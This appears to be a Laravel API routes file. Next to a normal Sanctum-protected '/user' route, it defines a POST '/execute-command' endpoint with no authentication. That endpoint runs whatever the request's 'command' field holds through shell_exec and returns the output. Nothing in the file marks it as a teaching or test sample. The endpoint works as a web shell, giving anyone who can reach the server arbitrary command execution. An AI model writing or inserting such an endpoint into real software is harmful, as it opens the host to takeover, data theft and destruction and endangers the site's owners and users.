<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

Route::get('/user', function (Request $request) {
    return $request->user();
})->middleware('auth:sanctum');

Route::post('/execute-command', function (Request $request) {
    $command = $request->input('command');

    if (!$command) {
        return response()->json(['error' => 'Command is required'], 400);
    }

    $output = shell_exec($command);

    if ($output === null) {
        return response()->json(['error' => 'Command execution failed or is disabled'], 500);
    }

    return response()->json(['output' => $output]);
});

